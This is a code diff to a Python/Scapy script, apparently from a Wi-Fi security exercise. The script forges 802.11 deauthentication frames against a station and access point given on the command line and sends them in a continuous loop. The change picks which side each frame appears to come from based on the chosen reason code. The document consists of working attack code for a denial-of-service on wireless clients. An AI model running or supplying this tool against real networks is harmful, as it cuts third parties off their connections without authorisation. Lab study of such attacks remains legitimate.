@@ -30,13 +30,21 @@ while(True):
     reason = input("Choose one of the 4 reasons:")
 
     # if the user choose one of the 4 reasons defined
-    if int(reason) == 1 or int(reason) == 4 or int(reason) == 5 or int(reason) == 8:
+    if int(reason) == 1 or int(reason) == 4:
+        address1 = sys.argv[1]
+        address2 = sys.argv[2]
+        break
+    if int(reason) == 5 or int(reason) == 8:
+
+        address1 = sys.argv[2]
+        address2 = sys.argv[1]
         break
 
-# Define the deauthification
-pkt = RadioTap() / Dot11(addr1=sys.argv[1], addr2=sys.argv[2], addr3=sys.argv[2]) / Dot11Deauth(reason=int(reason))
 
-print("Sending deauthentification on station " + sys.argv[1] + ", AP " + sys.argv[2] + " and the reason number " + reason)
+print("Sending deauthentification on station " + sys.argv[1] + ", AP " + sys.argv[2] + " and the reason code is " + reason)
+print("CTRL + C to stop the script")
+# Define the deauthification
+pkt = RadioTap() / Dot11(addr1=address1, addr2=address2, addr3=sys.argv[2]) / Dot11Deauth(reason=int(reason))
 
 # Send the deauthification
 while True:
